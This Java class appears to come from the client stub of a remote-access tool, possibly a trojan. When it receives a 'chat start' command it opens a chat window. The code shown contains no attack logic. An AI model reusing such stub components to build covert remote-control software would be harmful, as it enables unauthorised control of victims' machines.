package com.redpois0n.stub.packets.incoming;

import com.redpois0n.stub.Connection;
import com.redpois0n.stub.FrameChat;

public class Packet48ChatStart extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.frameChat = new FrameChat();
		Connection.frameChat.setVisible(true);
	}

}
